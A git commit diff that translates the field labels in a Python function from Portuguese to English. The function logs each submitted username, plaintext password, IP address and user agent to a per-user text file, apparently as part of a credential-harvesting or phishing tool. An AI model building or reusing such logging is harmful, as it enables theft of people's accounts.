8ee497e81e1d19550858f6ff647112d8dcbda4b8
Daniell Castelo Branco Ciriaco <danicbciriaco2@gmail.com>
2022-12-08 16:11:33 -0300

    Idioma mudado para Inglês

--- src/file.py
+++ src/file.py
@@ -3,8 +3,8 @@ class Files:
     def create_file(username: str, password: str, user_ip: str, user_agent: str) -> None:
         with open(f'./files/{user_ip}_{username}.txt', 'a+') as file:
             file.write(f'IP: {user_ip}\n')
-            file.write(f'Login: {username}\n')
-            file.write(f'Senha: {password}\n')
+            file.write(f'Username: {username}\n')
+            file.write(f'Password: {password}\n')
             file.write('\n')
             file.write(user_agent)
             file.write('\n')
